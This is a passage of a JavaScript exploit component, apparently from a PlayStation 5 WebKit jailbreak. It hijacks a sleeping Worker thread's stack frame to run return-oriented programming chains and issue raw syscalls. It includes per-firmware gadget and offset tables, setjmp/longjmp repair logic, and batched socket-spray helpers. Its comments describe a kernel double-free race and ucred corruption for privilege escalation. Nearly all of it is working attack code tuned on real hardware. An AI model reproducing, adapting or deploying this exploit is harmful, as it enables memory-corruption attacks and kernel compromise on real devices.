/* rop-worker.js — chain runner on a sacrificial Worker thread.
 *
 * WHY
 * ---
 * lapse-runtime's runChain is fatal on 10.00. Proven on hardware: getpid(),
 * zero arguments, kills the renderer exactly like a 5-arg syscall. Both
 * window.syscall and window.call route through it, so the port had no path to
 * the kernel at all.
 *
 * The kernel is innocent. Xfast_syscall (0xFFFFFFFF80461710, found via the
 * LSTAR MSR write) stashes user RSP as a VALUE - `mov gs:[0x7a8], rsp` - then
 * switches to the kernel stack. It never dereferences it, and performs no
 * caller or stack validation. A pivoted RSP is legal.
 *
 * runChain dies because it (a) runs on the RENDERER MAIN THREAD and (b) exits
 * via `mov rsp,rbp; pop rbp; ret`, unwinding to whatever frame RBP described
 * inside ICU's collator compare. So: run on a Worker, exit via longjmp.
 *
 * EVERY CONSTANT BELOW IS RE'd FROM THE DEVKIT 10.00 MODULES, and the live
 * survey confirmed the thread walk on hardware (10 threads, one 0x80000 stack).
 */
"use strict";

(function () {

/* ---------------------------------------------------------- RE'd offsets */

// libkernel_web. IDA: `for (j = qword_64218; j; j = j[7])` with j[21]/j[22]
// read as stack addr/size. A sibling list at 0x64228 links via +0x48 over the
// same struct (libthr's _thread_gc_list), which is what makes these field
// offsets trustworthy rather than coincidental.
const LK_THREAD_LIST  = 0x64218n;
const PTHREAD_NEXT    = 0x38n;
const PTHREAD_STACK   = 0xA8n;
const PTHREAD_STACKSZ = 0xB0n;

// jmp_buf layout, measured by disassembling setjmp/longjmp on 10.00 and
// re-checked on 12.00 (identical prologues, so the layout carries):
//   +0x00 rip  +0x08 rbx  +0x10 rsp  +0x18 rbp
//   +0x20 r12  +0x28 r13  +0x30 r14  +0x38 r15  +0x40 fcw
// longjmp ends `mov [rsp], rcx ; ret`, i.e. it writes the target rip AT the
// restored rsp - so pointing ctx.rsp at the hijacked slot makes it repair that
// slot on the way out.
const JB_RIP = 0x00n, JB_RSP = 0x10n;

// umtx2's worker hint. CONFIRMED on 10.00 by the live survey: of 10 threads,
// exactly one had a 0x80000 stack; the rest were 0x10000 / 0x200000.
const WORKER_STACK_SIZE = 0x80000n;

/* Per-firmware libkernel_web constants.
 *
 * Everything here used to be a bare 10.00 constant, which is why a 12.00 run
 * died in fire() with "slot holds libkernel+0x6d1d0, expected +0x190db". Each
 * value below was extracted from that firmware's own libkernel_web.sprx /
 * libSceNKWebKit.sprx and, where it is code, disassembled and string-matched
 * against what it claims to be. The 10.00 row is not re-typed: it is what the
 * extractor produces, and it reproduces all six previously hardcoded values
 * (pop_rsp 0x343AA, text 0x43190, syscall_wrapper 0x1A5B7, setjmp 0x1CB43,
 * longjmp 0x1CB9C, cond_wait_ret 0x190DB) exactly — which is the evidence that
 * the other thirteen rows were derived the same correct way.
 *
 * pop_rsp.mod matters: 11.x and 12.00 contain NO `pop rsp; ret` anywhere in
 * libkernel_web (byte scan for 5C C3: zero hits), so those rows source it from
 * libSceNKWebKit instead. 9.x/10.x keep their libkernel_web gadget so the
 * firmwares that already work are byte-for-byte unchanged.
 *
 * cond_wait_ret / cond_wait_ret2 are the two return addresses of the two
 * `call pthread_cond_wait` sites — same call shape in all fourteen builds
 * (mov rdi,r14; mov rsi,rbx; mov ecx,1; xor edx,edx; xor r8d,r8d; call; jmp).
 * They are what locateSlot() searches the parked stack for. */
const LKW_TABLE = {
    "09.00": { pop_rsp: { mod: "lk", rva: 0X34A9An }, text: 0X437A0n, syscall_wrapper: 0X1A357n, setjmp: 0X1C8E3n, longjmp: 0X1C93Cn, cond_wait_ret: 0X18E5En, cond_wait_ret2: 0X1F7CEn },
    "09.20": { pop_rsp: { mod: "lk", rva: 0X34A9An }, text: 0X437A0n, syscall_wrapper: 0X1A357n, setjmp: 0X1C8E3n, longjmp: 0X1C93Cn, cond_wait_ret: 0X18E5En, cond_wait_ret2: 0X1F7CEn },
    "09.40": { pop_rsp: { mod: "lk", rva: 0X34A9An }, text: 0X437A0n, syscall_wrapper: 0X1A357n, setjmp: 0X1C8E3n, longjmp: 0X1C93Cn, cond_wait_ret: 0X18E5En, cond_wait_ret2: 0X1F7CEn },
    "09.60": { pop_rsp: { mod: "lk", rva: 0X34A9An }, text: 0X437A0n, syscall_wrapper: 0X1A357n, setjmp: 0X1C8E3n, longjmp: 0X1C93Cn, cond_wait_ret: 0X18E5En, cond_wait_ret2: 0X1F7CEn },
    "10.00": { pop_rsp: { mod: "lk", rva: 0X343AAn }, text: 0X43190n, syscall_wrapper: 0X1A5B7n, setjmp: 0X1CB43n, longjmp: 0X1CB9Cn, cond_wait_ret: 0X190DBn, cond_wait_ret2: 0X1FA4Bn },
    "10.01": { pop_rsp: { mod: "lk", rva: 0X343AAn }, text: 0X43190n, syscall_wrapper: 0X1A5B7n, setjmp: 0X1CB43n, longjmp: 0X1CB9Cn, cond_wait_ret: 0X190DBn, cond_wait_ret2: 0X1FA4Bn },
    "10.20": { pop_rsp: { mod: "lk", rva: 0X343AAn }, text: 0X43190n, syscall_wrapper: 0X1A5B7n, setjmp: 0X1CB43n, longjmp: 0X1CB9Cn, cond_wait_ret: 0X190DBn, cond_wait_ret2: 0X1FA4Bn },
    "10.40": { pop_rsp: { mod: "lk", rva: 0X343AAn }, text: 0X43190n, syscall_wrapper: 0X1A5B7n, setjmp: 0X1CB43n, longjmp: 0X1CB9Cn, cond_wait_ret: 0X190DBn, cond_wait_ret2: 0X1FA4Bn },
    "10.60": { pop_rsp: { mod: "lk", rva: 0X343AAn }, text: 0X43190n, syscall_wrapper: 0X1A5B7n, setjmp: 0X1CB43n, longjmp: 0X1CB9Cn, cond_wait_ret: 0X190DBn, cond_wait_ret2: 0X1FA4Bn },
    "11.00": { pop_rsp: { mod: "wk", rva: 0X0D3C6n }, text: 0X43ADEn, syscall_wrapper: 0X1A8D7n, setjmp: 0X1CE63n, longjmp: 0X1CEBCn, cond_wait_ret: 0X193EBn, cond_wait_ret2: 0X1FE2Bn },
    "11.20": { pop_rsp: { mod: "wk", rva: 0X0D3C6n }, text: 0X43ADEn, syscall_wrapper: 0X1A8D7n, setjmp: 0X1CE63n, longjmp: 0X1CEBCn, cond_wait_ret: 0X193EBn, cond_wait_ret2: 0X1FE2Bn },
    "11.40": { pop_rsp: { mod: "wk", rva: 0X0D3C6n }, text: 0X43ADEn, syscall_wrapper: 0X1A8D7n, setjmp: 0X1CE63n, longjmp: 0X1CEBCn, cond_wait_ret: 0X193EBn, cond_wait_ret2: 0X1FE2Bn },
    "11.60": { pop_rsp: { mod: "wk", rva: 0X0D3C6n }, text: 0X43ADEn, syscall_wrapper: 0X1A8D7n, setjmp: 0X1CE63n, longjmp: 0X1CEBCn, cond_wait_ret: 0X193EBn, cond_wait_ret2: 0X1FE2Bn },
    "12.00": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X43F7En, syscall_wrapper: 0X1AE27n, setjmp: 0X1D3B3n, longjmp: 0X1D40Cn, cond_wait_ret: 0X197FBn, cond_wait_ret2: 0X2041Bn },
    "12.02": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X43F7En, syscall_wrapper: 0X1AE27n, setjmp: 0X1D3B3n, longjmp: 0X1D40Cn, cond_wait_ret: 0X197FBn, cond_wait_ret2: 0X2041Bn },
    "12.20": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X43F7En, syscall_wrapper: 0X1AE27n, setjmp: 0X1D3B3n, longjmp: 0X1D40Cn, cond_wait_ret: 0X197FBn, cond_wait_ret2: 0X2041Bn },
    "12.40": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X4403En, syscall_wrapper: 0X1AE47n, setjmp: 0X1D3D3n, longjmp: 0X1D42Cn, cond_wait_ret: 0X1981Bn, cond_wait_ret2: 0X2043Bn },
    "12.60": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X4403En, syscall_wrapper: 0X1AE47n, setjmp: 0X1D3D3n, longjmp: 0X1D42Cn, cond_wait_ret: 0X1981Bn, cond_wait_ret2: 0X2043Bn },
    "12.70": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X4403En, syscall_wrapper: 0X1AE47n, setjmp: 0X1D3D3n, longjmp: 0X1D42Cn, cond_wait_ret: 0X1981Bn, cond_wait_ret2: 0X2043Bn },
};

/* Legacy hijack-slot offset, kept ONLY as a cross-check to report against.
 *
 * The old code hardcoded this and refused to fire unless stack+0x7FC18 held
 * cond_wait's return address. The comment right here used to say a hardcoded
 * stack offset "is exactly the kind of measured constant that rots across
 * firmware" — and it did.
 *
 * MEASURED ON HARDWARE, both consoles:
 *   10.00 — slot at stack+0x7FC18, holds libkernel+0x190DB
 *   12.00 — slot at stack+0x7FC28, holds libkernel+0x197FB;
 *           stack+0x7FC18 holds libkernel+0x6D1D0, which is not even text
 *           (12.00 text ends at 0x43F7E) — it is bss.
 * So the frame moved by 0x10 and the old constant pointed at unrelated data.
 * Note the RVA itself was never wrong: 0x197FB is exactly what the call-site
 * signature predicts for 12.00. Only the stack POSITION rotted.
 *
 * A stack offset cannot be recovered statically from the module, so it is no
 * longer guessed at all — locateSlot() searches for it. This constant survives
 * so the log can say whether the firmware still happens to match 10.00.
 *
 * Deliberately NOT used as a fast path. Probing the hint first and accepting a
 * match would be a real regression: on 12.00 the hint sits BELOW the live frame,
 * so had 0x7FC18 happened to hold a stale copy of the same return address, the
 * shortcut would have hijacked dead bytes. Top-down is the only ordering that
 * guarantees the live frame, and it is paid once. */
const SLOT_HINT = 0x7FC18n;

/* HARD INVARIANT — do not reorder the chain.
 *
 * At libkernel+0x190f2/0x190f5 the resume site does `mov rsi, rbx` and
 * `mov rdi, r14` and passes both to sub_1F9E0 BEFORE its `pop rbx; pop r14`.
 * So rbx and r14 are LIVE across the cond_wait call. longjmp restores
 * rbx/rbp/r12-r15 from the jmp_buf, so the jmp_buf must contain the WORKER's
 * values, not ours - which it does only if setjmp runs before anything that
 * clobbers a callee-saved register. `pop rsp` and `pop rdi` are safe (rsp is
 * reloaded by longjmp, rdi is caller-saved); nothing else may precede setjmp.
 */

const JMPBUF_SIZE = 0x48;
const CHAIN_CAP   = 0x380;
/* Batched chains get their own, much larger buffer from the worker-stack
 * arena. 150 setsockopt calls = 150 * (5 pops + 1 call) = 1650 qwords, far
 * past CHAIN_CAP - and the spray is where all the time goes: find_twins does
 * 300 syscalls a round at ~0.215 ms each (~65 ms), so the 5000-round budget is
 * 5.4 minutes. Issuing the whole spray as ONE chain makes it one round trip. */
const BATCH_CAP   = 0x8000;

/* ----------------------------------------------------------------- state */

const W = {
    ready: false, kbase: 0n, wbase: 0n, gadgets: null,
    fw: "", lkw: null,              // firmware label + its LKW_TABLE row
    worker: null, threads: [], stack: 0n, stacksz: 0n,
    ctx: 0n, retval: 0n, chainBuf: 0n,
    slot: 0n, slotRva: 0n, origRet: 0n, origNext: 0n,
    fired: 0,
};

function log(m) {
    if (window.slopkit && window.slopkit.mark) window.slopkit.mark("RW " + m);
    else console.log("[rop-worker] " + m);
}
const hex = (v) => "0x" + BigInt(v).toString(16);
const rd64 = (a) => BigInt(window.read64(a));
const wr64 = (a, v) => window.write64(a, BigInt(v));

function g(name) {
    const t = W.lkw;
    if (t) {
        switch (name) {
            // pop_rsp lives in libkernel_web on 9.x/10.x and in libSceNKWebKit
            // on 11.x/12.00, so the row names its own module.
            case "pop_rsp":
                return (t.pop_rsp.mod === "wk" ? W.wbase : W.kbase) + t.pop_rsp.rva;
            case "setjmp":  return W.kbase + t.setjmp;
            case "longjmp": return W.kbase + t.longjmp;
            case "syscall_wrapper": return W.kbase + t.syscall_wrapper;
        }
    }
    const v = W.gadgets && W.gadgets[name];
    if (v === undefined) throw new Error("rop-worker: gadget '" + name + "' missing");
    return BigInt(v);
}

/* Find the frame to hijack, instead of assuming where it is.
 *
 * The worker is parked in pthread_cond_wait, so its stack holds that call's
 * return address; overwriting it makes the worker pivot into our chain the
 * moment postMessage wakes it. What we need is the ADDRESS of that saved return
 * address, and that is a runtime stack layout — not something any amount of
 * static analysis of the module can tell us. So search for it.
 *
 * Scan top-down, and take the FIRST hit. That is not arbitrary: the stack grows
 * down, so the live parked frame is the highest-addressed occurrence, and any
 * identical value further down is dead bytes left by a deeper call that already
 * returned. Firing at one of those would corrupt the worker while telling us
 * nothing, which is the failure mode the old hardcoded-offset guard existed to
 * prevent — this keeps the guarantee without pinning the offset.
 *
 * The window is bounded below by STACK_ARENA_LIMIT: everything under that is
 * our own scratch allocator (see alloc()), so a match there would be our own
 * chain bytes, never a real frame. Above it is the parked-frame region the
 * hardware survey measured at 0x7f918..0x7ffc8 on 10.00.
 *
 * Memoised — the parked frame does not move for the life of the worker, and
 * fireSync() is on the hot path of a race that issues thousands of syscalls. */
function locateSlot() {
    if (W.slot) return W.slot;
    if (!W.stack) findWorkerStack();
    if (!W.lkw) throw new Error("rop-worker: init() needs a firmware");

    const want = [W.kbase + W.lkw.cond_wait_ret,
                  W.kbase + W.lkw.cond_wait_ret2];

    const take = (off, v) => {
        W.slot = W.stack + off;
        W.slotRva = v - W.kbase;
        log("slot found at stack+" + hex(off) + " = libkernel+" + hex(W.slotRva)
            + (off === SLOT_HINT ? " (matches the 10.00 offset)"
                                 : " (10.00 offset was " + hex(SLOT_HINT) + ")"));
        return W.slot;
    };

    // Pass 1: the parked-frame region. 10.00 measured frames at 0x7f918..0x7ffc8,
    // so the top 64 KB is ~40x headroom.
    for (let off = W.stacksz - 8n; off >= STACK_ARENA_LIMIT; off -= 8n) {
        const v = rd64(W.stack + off);
        if (v === want[0] || v === want[1]) return take(off, v);
    }

    /* Pass 2: the rest of the stack. Only reachable if a firmware parks far
     * deeper than any measured build, and only ever runs on the first call —
     * which is during survey(), before alloc() has handed out any of the arena
     * below STACK_ARENA_LIMIT. So a hit down here is still a real frame and not
     * our own chain bytes. Widening beats throwing: a miss costs the user a
     * reboot to discover, and this is the branch that would have to be guessed
     * blind otherwise. It is loud so it never passes for normal. */
    for (let off = STACK_ARENA_LIMIT - 8n; off >= 0x1000n; off -= 8n) {
        const v = rd64(W.stack + off);
        if (v === want[0] || v === want[1]) {
            log("WARNING: parked frame found BELOW the arena limit, at stack+"
                + hex(off) + " — raise STACK_ARENA_LIMIT for FW " + W.fw
                + " or alloc() will eventually overwrite it");
            return take(off, v);
        }
    }
    /* Say what was at the legacy offset too, and whether it is even code. The
     * 12.00 failure reported "slot holds libkernel+0x6d1d0" with no hint that
     * 0x6d1d0 is past the end of text (0x43F7E) and therefore could not be a
     * return address at all — that one fact is what identified this as a moved
     * frame rather than a wrong RVA. */
    const at = rd64(W.stack + SLOT_HINT) - W.kbase;
    throw new Error("rop-worker: no parked cond_wait frame in stack+"
        + hex(STACK_ARENA_LIMIT) + ".." + hex(W.stacksz) + " (looked for libkernel+"
        + hex(W.lkw.cond_wait_ret) + " / +" + hex(W.lkw.cond_wait_ret2)
        + "); stack+" + hex(SLOT_HINT) + " holds libkernel+" + hex(at)
        + (at >= W.lkw.text ? " which is NOT text (text ends " + hex(W.lkw.text) + ")"
                            : " which is text but not a cond_wait return"));
}

/* --------------------------------------------------------------- threads */

function spawnWorker() {
    if (!W.worker) W.worker = new Worker("rop_slave.js");
    return W.worker;
}

function ping(ms) {
    return new Promise((resolve, reject) => {
        const t = setTimeout(() => reject(new Error("worker timeout")), ms || 4000);
        W.worker.onmessage = () => { clearTimeout(t); resolve(true); };
        W.worker.postMessage(0);
    });
}

function enumerate(limit) {
    const out = [];
    let t = rd64(W.kbase + LK_THREAD_LIST), n = 0;
    while (t !== 0n && n < (limit || 64)) {
        out.push({ pthread: t, stack: rd64(t + PTHREAD_STACK),
                   size: rd64(t + PTHREAD_STACKSZ) });
        t = rd64(t + PTHREAD_NEXT);
        n++;
    }
    return (W.threads = out);
}

function findWorkerStack() {
    for (const t of enumerate())
        if (t.size === WORKER_STACK_SIZE) { W.stack = t.stack; W.stacksz = t.size; return t; }
    throw new Error("rop-worker: no 0x80000 stack among "
                    + W.threads.length + " threads");
}

/* ----------------------------------------------------------- chain build */

function Chain() { this.q = []; }
Chain.prototype.raw  = function (v) { this.q.push(BigInt(v)); return this; };
Chain.prototype.pop  = function (r, v) { return this.raw(g("pop_" + r)).raw(v); };
Chain.prototype.call = function (a) { return this.raw(a); };
// store an immediate to an absolute address, using the verified
// `mov qword [rdi], rax ; ret` gadget
Chain.prototype.store = function (addr, val) {
    return this.pop("rax", val).pop("rdi", addr).raw(g("mov_qword_rdi_rax"));
};
Chain.prototype.commit = function (at, cap) {
    const n = this.q.length * 8;
    const lim = cap || CHAIN_CAP;
    if (n > lim) throw new Error("rop-worker: chain " + n + " > cap " + lim);
    for (let i = 0; i < this.q.length; i++) wr64(at + BigInt(i * 8), this.q[i]);
    return at;
};

/* Wrap a payload with the setjmp prologue and longjmp epilogue.
 * See the HARD INVARIANT above: setjmp is first, always. */
function wrap(payload, withDone) {
    const c = new Chain();
    c.pop("rdi", W.ctx).call(g("setjmp"));        // FIRST. captures worker regs
    payload(c);
    // ordering matters: result is already stored by the payload; publish the
    // completion flag only afterwards so a poller never sees a half-written
    // result (window.read64 is byte-wise and not atomic).
    if (withDone) c.store(W.done, DONE_MAGIC);
    // patch the captured context so longjmp resumes the worker cleanly
    c.store(W.ctx + JB_RIP, W.origRet);           // resume at cond_wait's caller
    c.store(W.ctx + JB_RSP, W.slot);              // rsp -> slot; longjmp writes
                                                  //   rip there and rets
    c.store(W.slot + 8n, W.origNext);             // restore the word we used
                                                  //   to feed `pop rsp`
    c.pop("rdi", W.ctx).pop("rsi", 1n).call(g("longjmp"));
    return c;
}

/* Block until the worker is genuinely back in cond_wait.
 *
 * fireSync() has always done this; fire() (the async path) never did, and got
 * away with it only because it was used once, for a single getpid, right after
 * survey(). It is no longer: the staged bisect fires three chains back to back,
 * and firing while the worker is still unwinding is the documented cause of the
 * renderer SIGSEGVs under sustained load (a slot rewritten mid-unwind makes it
 * pivot into the next chain with no postMessage at all).
 *
 * Seeing the return address reappear is NOT sufficient — longjmp restores it
 * with `mov [rsp], rcx ; ret` while the worker is still executing that very
 * ret. Requiring slot+8 to be the worker's own data again is what proves it is
 * past that point, so both words are checked and must agree repeatedly. */
const PARK_STABLE = 8;

function ensureParked() {
    const want = W.kbase + W.slotRva;

    // Capture the pristine frame exactly once, while known parked. Re-reading
    // origNext per fire is a corruption bug: caught mid-unwind it captures our
    // OWN previous chain pointer, which the next chain then faithfully restores
    // into the worker's stack.
    if (W.pristineNext === undefined) {
        for (let i = 0; i < 2000000 && rd64(W.slot) !== want; i++) { /* park */ }
        if (rd64(W.slot) !== want)
            throw new Error("rop-worker: worker never parked for first capture"
                            + " (slot holds " + hex(rd64(W.slot)) + ")");
        W.pristineRet = rd64(W.slot);
        W.pristineNext = rd64(W.slot + 8n);
        return;
    }

    let stable = 0;
    for (let i = 0; i < 4000000; i++) {
        if (rd64(W.slot) === want && rd64(W.slot + 8n) === W.pristineNext) {
            if (++stable >= PARK_STABLE) return;
        } else {
            stable = 0;
        }
    }
    throw new Error("rop-worker: worker never re-parked, slot holds "
                    + hex(rd64(W.slot)) + " next=" + hex(rd64(W.slot + 8n)));
}

/* ------------------------------------------------------------------ fire */

async function fire(payload, timeoutMs) {
    if (!W.ready) throw new Error("rop-worker: init() first");
    if (!W.stack) findWorkerStack();

    locateSlot();
    ensureParked();
    W.origRet  = W.pristineRet;
    W.origNext = W.pristineNext;

    // Re-check on every fire. locateSlot() proved the frame was there when it
    // searched; this proves it is STILL there now. A wrong slot corrupts the
    // worker and tells us nothing about why, so refuse rather than write.
    const rva = W.origRet - W.kbase;
    if (rva !== W.lkw.cond_wait_ret && rva !== W.lkw.cond_wait_ret2) {
        throw new Error("rop-worker: slot holds libkernel+" + hex(rva)
                        + ", expected +" + hex(W.lkw.cond_wait_ret)
                        + " or +" + hex(W.lkw.cond_wait_ret2) + " — not firing");
    }

    const chain = wrap(payload).commit(W.chainBuf);
    wr64(W.retval, 0n);

    wr64(W.slot, g("pop_rsp"));   // cond_wait's ret lands here
    wr64(W.slot + 8n, chain);     // pop rsp loads this

    const t0 = Date.now();
    await ping(timeoutMs || 5000);
    W.fired++;
    return { ms: Date.now() - t0, retval: rd64(W.retval) };
}

/* ------------------------------------------------- SYNCHRONOUS execution
 *
 * netctrl-ps5.js is synchronous throughout (`sys.read(...)` returns a number)
 * and its race spins thousands of iterations, so an await per syscall would
 * mean a full async refactor AND would wreck the timing the triple-free
 * depends on. So do not await: let the chain write the result, and busy-poll
 * it from the main thread.
 *
 * Why that is sound, from RE rather than hope:
 *   * the worker is blocked in the KERNEL on a condvar - webkit+0x3E1D0 is a
 *     WTF::Condition wrapper calling pthread_cond_wait / _timedwait;
 *   * libkernel's _umtx_op is a leaf syscall stub (`mov rax,0x1c6 ; syscall ;
 *     ret` at 0x1CC40), so both sleeping and waking happen inline on the
 *     calling thread;
 *   * therefore postMessage's notify is a syscall executed by US, and the
 *     worker becomes runnable on another core immediately - the main thread
 *     never has to yield for it to run.
 *
 * Bounded, and reports how long it took, so a wrong assumption shows up as a
 * clean timeout instead of a hang.
 */
/* The result slot CANNOT be polled directly. window.read64 is not atomic - it
 * reads eight separate bytes through the carrier - so a poll that races the
 * chain's store returns a spliced value. That is not hypothetical: a run
 * returned 0x00ADBEEFDEADBEEF, i.e. seven bytes of the old sentinel plus the
 * top byte of the new result (pid 218 = 0x...DA, high byte 0x00).
 *
 * So the chain writes the RESULT first and a DONE flag second, and we poll the
 * flag. A torn read of the flag can only mix zero bytes with magic bytes and
 * therefore never equals the magic, so the value is only read once it is
 * settled. The async path never hit this because await guarantees ordering. */
const DONE_MAGIC = 0x5A17C0DEF00D1234n;

function fireSync(payload, big, spins) {
    if (!W.ready) throw new Error("rop-worker: init() first");
    if (!W.stack) findWorkerStack();

    locateSlot();

    /* Wait for the worker to be parked again before touching the slot.
     *
     * fireSync returns as soon as the chain publishes the DONE flag, which
     * happens BEFORE the longjmp runs and before the worker unwinds back into
     * cond_wait. Firing again in that window hijacks a slot the worker is
     * still using - a run threw "slot holds libkernel+0x7f6f76000" (a JS heap
     * pointer) because it read the frame mid-transition. Harmless in the
     * getpid tests, guaranteed to bite once the race issues syscalls
     * back-to-back.
     *
     * The slot is self-repairing: longjmp ends `mov [rsp], rcx ; ret` with rsp
     * pointing at it, so the original return address reappears once the worker
     * is home. Spin for that rather than assuming it. */
    /* The value the slot must return to. Taken from what locateSlot() verified
     * when it found the frame, NOT re-read here: on every fire after the first
     * the slot can still hold our own pop_rsp/chain pointer, so sampling it now
     * would make the parked-check wait for the wrong value (or pass instantly
     * on our own bytes). W.slotRva is fixed for the life of the worker. */
    const want = W.kbase + W.slotRva;

    /* Capture the PRISTINE frame exactly once.
     *
     * This used to re-read origNext on every fire, which is a corruption bug:
     * caught mid-unwind it captures OUR OWN previous chain pointer, and the
     * next chain then faithfully "restores" that into the worker's stack. The
     * real value never changes, so read it once while the worker is known
     * parked and reuse it forever. */
    if (W.pristineNext === undefined) {
        for (let i = 0; i < 2000000 && rd64(W.slot) !== want; i++) { /* park */ }
        if (rd64(W.slot) !== want)
            throw new Error("rop-worker: worker never parked for first capture");
        W.pristineRet = rd64(W.slot);
        W.pristineNext = rd64(W.slot + 8n);
    }

    /* Seeing the return address reappear is NOT proof the worker is parked.
     * longjmp restores the slot with `mov [rsp], rcx ; ret` - the value is back
     * while the worker is still executing that very ret. Overwriting the slot
     * in that window makes it pivot straight into the next chain with no
     * postMessage, mid-unwind, which is the renderer SIGSEGV we kept hitting
     * under sustained syscall load (thousands of back-to-back fires in
     * find_triplet).
     *
     * So require BOTH words to match the pristine frame, and require them to
     * stay matched across consecutive samples - the worker has to be far
     * enough past the ret that slot+8 is its own data again, not our chain. */
    /* 8, not 64. Each sample is two rd64 calls through the WebKit read
     * primitive at ~6 us each, so the count is paid on EVERY syscall: 64
     * samples measured 0.985 ms/syscall against 0.220 ms before, pushing
     * find_twins' worst case from 34 s to 151 s. That matters because the
     * whole reason for hurrying is the ucred being corrupt while we spray -
     * a slower chain is a wider panic window.
     *
     * What we actually need is confirmation that slot+8 holds the worker's own
     * data rather than our chain pointer, i.e. that it is past the
     * `mov [rsp],rcx ; ret`. A few consecutive agreeing samples establish that;
     * 64 was arbitrary caution. Check the cheap word first and only look at
     * slot+8 once it matches. */
    /* STABLE=8, BOTH words re-checked every sample. This exact configuration
     * is the one that produced a working jailbreak with no renderer crash.
     *
     * Tried and rejected:
     *   STABLE=64, both words  - safe but 0.985 ms/syscall; the widened ucred
     *                            exposure window then caused a KERNEL panic.
     *   STABLE=4, slot+8 confirmed ONCE then only slot re-checked - faster
     *                            (0.225 ms) but the renderer SIGSEGV returned
     *                            (cause:11, dump NPXS40087_1786156077).
     *                            slot+8 is the word that carries the
     *                            information - checking it once is not enough,
     *                            because the worker can still be mid-unwind
     *                            when slot alone looks right.
     * ~0.32 ms/syscall is the price of not corrupting the Worker. */
    const STABLE = 8;
    let settled = false, stable = 0;
    for (let i = 0; i < 4000000; i++) {
        if (rd64(W.slot) === want && rd64(W.slot + 8n) === W.pristineNext) {
            if (++stable >= STABLE) { settled = true; break; }
        } else {
            stable = 0;
        }
    }
    if (!settled) {
        const rva = rd64(W.slot) - W.kbase;
        throw new Error("rop-worker: slot never settled, holds libkernel+"
                        + hex(rva) + " next=" + hex(rd64(W.slot + 8n))
                        + ", expected +" + hex(W.slotRva)
                        + " next=" + hex(W.pristineNext));
    }

    W.origRet = W.pristineRet;
    W.origNext = W.pristineNext;

    wr64(W.retval, 0n);
    wr64(W.done, 0n);
    let buf = W.chainBuf, chainCap = CHAIN_CAP;
    if (big) {
        if (!W.batchBuf) W.batchBuf = alloc(BATCH_CAP);
        buf = W.batchBuf; chainCap = BATCH_CAP;
    }
    const chain = wrap(payload, /*withDone=*/true).commit(buf, chainCap);

    // swallow the worker's reply; we are not awaiting it
    W.worker.onmessage = function () {};

    wr64(W.slot, g("pop_rsp"));
    wr64(W.slot + 8n, chain);
    W.worker.postMessage(0);          // wake syscall happens on THIS thread

    const cap = spins || 20000000;
    for (let i = 0; i < cap; i++) {
        if (rd64(W.done) === DONE_MAGIC) {
            W.fired++;
            return { retval: rd64(W.retval), spins: i };
        }
    }
    /* Say WHAT the chain got through, not just that it timed out.
     *
     * The DONE flag is written by the chain itself, second-to-last, after the
     * payload has already stored its result. So its state splits the two
     * failures that look identical from outside:
     *   done==MAGIC  -> the chain ran to completion; the worker just never got
     *                   back to its message loop (resume/longjmp problem).
     *   done==0      -> the chain died partway; the slot tells us whether it
     *                   even pivoted (still holds pop_rsp = never started, or
     *                   the parked return address = came back without finishing).
     * Without this the 12.00 stall at the first syscall is indistinguishable
     * from a wedged worker, and each guess costs a reboot. */
    const doneNow = rd64(W.done), slotNow = rd64(W.slot);
    throw new Error("rop-worker: sync poll timed out after " + cap + " spins"
        + "; done=" + hex(doneNow)
        + (doneNow === DONE_MAGIC ? " (CHAIN COMPLETED — worker never resumed)"
                                  : " (chain did not finish)")
        + " retval=" + hex(rd64(W.retval))
        + " slot=" + hex(slotNow)
        + (slotNow === g("pop_rsp") ? " (still our pivot — worker never woke)"
           : slotNow === W.kbase + W.slotRva ? " (back to parked return address)"
           : " (unrecognised)"));
}

/* Run many syscalls in ONE worker round trip.
 * calls = [[num, a1..a5], ...]. Return values are discarded - this exists for
 * fire-and-forget sprays (setsockopt) and for probes that write their result
 * into caller-supplied buffers (getsockopt), which is every hot loop we have.
 * One round trip instead of N turns a 65 ms find_twins round into about 1 ms. */
function syscallBatch(calls) {
    if (!calls.length) return 0;
    return fireSync((c) => {
        const regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
        for (const call of calls) {
            for (let i = 0; i < 5; i++)
                if (call[i + 1] !== undefined) c.pop(regs[i], call[i + 1]);
            c.pop("rax", BigInt(call[0])).call(g("syscall_wrapper"));
        }
    }, /*big=*/true).retval;
}

/* Spray helper: for each item [storeAddr, storeVal, arg1] the chain STORES
 * storeVal at storeAddr and then issues syscall(num, arg1, a2, a3, a4, a5).
 * Lets one chain tag-and-spray N sockets from a single shared buffer, which is
 * otherwise impossible - every call in a batch sees the buffer as it is when
 * the chain runs, not when it was built. */
function syscallBatchTagged(items, num, a2, a3, a4, a5) {
    if (!items.length) return 0;
    return fireSync((c) => {
        for (const [addr, val, a1] of items) {
            c.store(addr, val);
            c.pop("rdi", a1);
            if (a2 !== undefined) c.pop("rsi", a2);
            if (a3 !== undefined) c.pop("rdx", a3);
            if (a4 !== undefined) c.pop("rcx", a4);
            if (a5 !== undefined) c.pop("r8", a5);
            c.pop("rax", BigInt(num)).call(g("syscall_wrapper"));
        }
    }, /*big=*/true).retval;
}

/* Run ONE leading syscall (lead = [num, a1, a2, ...]) then the tagged spray, all
 * in the SAME chain / one worker wake. Purpose: put the double-free (close) and
 * the rthdr spray in one wake so they run on the SAME core - the freed chunk
 * lands in that core's per-CPU bucket and the same-core spray reclaims it,
 * defeating the park/migrate-between-syscalls that produces self=all. Sound only
 * because every batched syscall is non-blocking (rthdr setsockopt = M_NOWAIT,
 * close = non-blocking; RE'd) so the worker never parks mid-chain. */
function leadThenBatchTagged(lead, items, num, a2, a3, a4, a5) {
    if (!items.length) return 0;
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
    return fireSync((c) => {
        if (lead && lead.length) {
            for (let i = 1; i < lead.length && i <= 5; i++)
                if (lead[i] !== undefined) c.pop(regs[i - 1], lead[i]);
            c.pop("rax", BigInt(lead[0])).call(g("syscall_wrapper"));
        }
        for (const [addr, val, a1] of items) {
            c.store(addr, val);
            c.pop("rdi", a1);
            if (a2 !== undefined) c.pop("rsi", a2);
            if (a3 !== undefined) c.pop("rdx", a3);
            if (a4 !== undefined) c.pop("rcx", a4);
            if (a5 !== undefined) c.pop("r8", a5);
